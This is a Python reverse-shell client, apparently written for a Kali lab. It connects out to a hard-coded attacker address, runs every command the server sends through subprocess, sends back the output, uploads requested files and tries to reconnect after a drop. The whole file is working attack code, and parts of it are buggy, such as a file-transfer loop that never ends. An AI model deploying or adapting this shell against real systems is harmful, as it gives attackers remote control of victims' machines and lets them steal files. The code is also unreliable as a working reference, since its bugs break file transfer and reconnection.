import atexit
import os
import socket
import subprocess
import time
#import tqdm

#Host IP is that of the Kali attack system
SERVER_HOST = "192.168.56.107"
#The same as server side
SERVER_PORT = 5003
BUFFER_SIZE = 1024 * 128
SEPARATOR = "<sep>"

s = socket.socket()
s.connect((SERVER_HOST,SERVER_PORT))

#Send cwd just after connection
cwd = os.getcwd()
s.send(cwd.encode())

#Function to transfer files to the remote machine
#Takes file name or path as an argument
def FileTransfer(args):
    filename = os.path.basename(args[1])
    filesize = os.path.getsize(filename)
    if not filename:
        raise TypeError("Must include file name parameter")
    s.send(f"{filename}{SEPARATOR}{filesize}{SEPARATOR}{cwd}".encode())
    #Update progress bar; REQUIRES TQDM
    #progress = tqdm.tqdm(range(filesize),f"Sending {filename}", unit="B",unit_scale=True,unit_divisor=1024)
    with open(filename, "rb") as f:
        while True:
            #Read bytes from the file
            bytesRead = f.read(BUFFER_SIZE)
            if(bytesRead == 0):
                #File transmitting is done
                break
            #Use sendall to assure transmission in busy networks
            s.sendall(bytesRead)
            #Update the progress bar; REQUIRES TQDM
            #progress.update(len(bytesRead))

#If the shell disconnects, try to reconnect in ten seconds before exiting
def tryAgain():
    time.sleep(10)
    s = socket.socket()
    s.connect((SERVER_HOST,SERVER_PORT))

    if not s:
        exit

    #Send cwd just after connection
    cwd = os.getcwd()
    s.send(cwd.encode())
    main()


#Main loop
def main():
    while True:
        #Receive server's command
        command = s.recv(BUFFER_SIZE).decode()
        args = command.split()
        #Check for exit case
        if command.lower() == "exit":
            break
        #Changing directory
        if args[0].lower() == "cd":
            try:
                os.chdir(' '.join(args[1:]))
            #Set error as output
            except FileNotFoundError as e:
                output = str(e)
            #If operation successful, set as output
            else:
                output = ""
        #File transfer
        if args[0].lower() == "transfer":
            FileTransfer(args)
        #Execute command and retrieve results
        else:
            output = subprocess.getoutput(command)
            #Get cwd as output
            cwd = os.getcwd()
            #Return results to server
            message = f"{output}{SEPARATOR}{cwd}"
            s.send(message.encode())

main()
#Close connection
s.close()
atexit.register(tryAgain)